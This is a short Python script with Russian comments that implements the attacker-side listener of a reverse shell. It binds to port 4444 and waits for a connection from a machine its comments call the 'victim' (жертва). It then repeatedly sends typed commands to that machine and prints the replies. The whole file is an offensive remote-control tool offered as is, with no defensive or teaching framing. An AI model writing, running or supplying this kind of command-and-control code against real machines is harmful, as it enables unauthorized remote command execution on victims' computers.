import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # создаём объект класса socket
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("enter ip", 4444))  # привязываем ip и порт
listener.listen()  # прослушиваем порт
print("[+]Waiting for connection...\n")
connection, address = listener.accept()  # как только подключение установленно, получаем адрес жертвы и подключение
print("[+]Connected to " + address[0] + "\n")
while True:
    data = connection.recv(1024)  # получаем ответ
    print(data.decode("utf8"))  # декодируем и выводим
    print("[#]", end="")  # даём знать, что можно вводить команду

    cmd = input()  # получаем команду
    if cmd == "exit":
        break
    connection.send(bytes(cmd, encoding="utf8"))  # отправляем команду жертве
